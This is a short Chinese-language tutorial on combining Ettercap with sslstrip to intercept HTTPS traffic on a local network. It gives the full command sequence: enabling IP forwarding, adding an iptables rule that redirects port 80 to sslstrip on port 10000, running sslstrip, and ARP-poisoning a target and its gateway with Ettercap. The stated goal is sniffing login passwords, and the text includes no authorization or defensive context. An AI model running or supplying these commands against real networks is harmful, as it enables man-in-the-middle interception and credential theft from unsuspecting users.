## Ettercap结合sslstrip对ssl/https进行攻击  
Ettercap是一个非常强大的嗅探欺骗工具；在以往的ettercap的使用过程中，我们大多用来嗅探http，ftp，和一些加密比较简单的邮箱等的密码，
对于新型的ssl/https等的加密协议就显得不是太完美；这里我们使用一款专门针对ssl/https加密协议的工具配合Ettercap进行局域网嗅探欺骗：
sslstrip。

0x01、开启转发：
```bash
echo "1">/proc/sys/net/ipv4/ip_forward
```
0x02、iptables过滤数据包
```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```
0x03、监听转发端口
```bash
sslstrip -l 10000 
```
0x04、arp嗅探
```bash
ettercap -T -q -i eth0 -M arp:remote /目标地址/ /网关地址/
```